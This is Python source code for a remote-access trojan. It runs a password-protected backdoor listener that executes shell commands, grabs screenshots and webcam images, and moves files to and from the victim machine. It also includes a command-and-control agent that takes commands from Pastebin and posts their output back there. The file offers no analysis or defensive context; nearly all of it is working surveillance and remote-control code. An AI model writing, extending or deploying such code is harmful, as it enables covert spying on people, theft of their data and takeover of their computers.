import socket
import subprocess
import threading
import base64
import hashlib
import io
import logging
import os
import platform
import shutil
import sys
from cryptography.fernet import Fernet
from pynput import keyboard
from PIL import ImageGrab
import cv2
import requests
import os

def capture_screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    return buf.getvalue()

def capture_webcam_image():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None
    _, buf = cv2.imencode('.jpg', frame)
    return buf.tobytes()

def handle_client(client_socket, backdoor_password):
    try:
        encryptor = Fernet(base64.urlsafe_b64encode(hashlib.sha256(backdoor_password.encode()).digest()))
        client_socket.send(b"Password: ")
        encrypted_password = client_socket.recv(1024)
        password = encryptor.decrypt(encrypted_password).decode().strip()
        if password != backdoor_password:
            client_socket.send(encryptor.encrypt(b"Authentication failed.\n"))
            client_socket.close()
            return
        client_socket.send(encryptor.encrypt(b"Authenticated. Enter commands:\n"))
        while True:
            encrypted_command = client_socket.recv(4096)
            if not encrypted_command:
                break
            command = encryptor.decrypt(encrypted_command).decode().strip()
            if command == "exit":
                break
            elif command == "screenshot":
                img_data = capture_screenshot()
                client_socket.send(len(img_data).to_bytes(4, 'big'))
                client_socket.send(img_data)
            elif command == "webcam_snap":
                img_data = capture_webcam_image()
                if img_data:
                    client_socket.send(len(img_data).to_bytes(4, 'big'))
                    client_socket.send(img_data)
                else:
                    client_socket.send(b"0")
            elif command.startswith("download "):
                filepath = command.split(" ", 1)[1]
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    client_socket.send(len(data).to_bytes(4, 'big'))
                    client_socket.send(data)
                else:
                    client_socket.send(b"0")
            elif command.startswith("upload "):
                filepath = command.split(" ", 1)[1]
                data_len_bytes = client_socket.recv(4)
                if not data_len_bytes:
                    break
                data_len = int.from_bytes(data_len_bytes, 'big')
                data = b""
                while len(data) < data_len:
                    packet = client_socket.recv(data_len - len(data))
                    if not packet:
                        break
                    data += packet
                with open(filepath, 'wb') as f:
                    f.write(data)
                client_socket.send(encryptor.encrypt(b"File uploaded successfully."))
            else:
                output = subprocess.getoutput(command)
                client_socket.send(output.encode() + b"\n")
    except Exception as e:
        logging.error(f"Error handling client: {e}")
    finally:
        client_socket.close()

def backdoor_listener(port, backdoor_password):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    logging.info(f"Backdoor listening on port {port}")

    while True:
        client_socket, addr = server.accept()
        logging.info(f"Connection from {addr}")
        threading.Thread(target=handle_client, args=(client_socket, backdoor_password)).start()

def c2_agent(c2_url, sleep_interval=60):
    """
    The main loop for the C2 agent. It polls a URL for commands.
    """
    from modules.c2 import get_from_pastebin, post_to_pastebin

    paste_id = c2_url.split('/')[-1]
    logging.info(f"C2 agent started. Polling Pastebin ID: {paste_id}")

    while True:
        try:
            command = get_from_pastebin(paste_id)
            if command and command.strip() != "waiting...":
                logging.info(f"Received command: {command}")

                # Execute the command
                output = subprocess.getoutput(command)

                # Post the output back to a new paste
                response_title = f"Output for command: {command[:20]}"
                response_url = post_to_pastebin(response_title, output)

                if response_url:
                    # Clear the command paste by overwriting it
                    # (This is a simplified approach)
                    post_to_pastebin(f"Command executed. Output at {response_url}", "waiting...")
                else:
                    logging.error("Failed to post command output.")

            else:
                logging.info("No new command found. Sleeping.")

        except Exception as e:
            logging.error(f"Error in C2 agent loop: {e}")

        time.sleep(sleep_interval)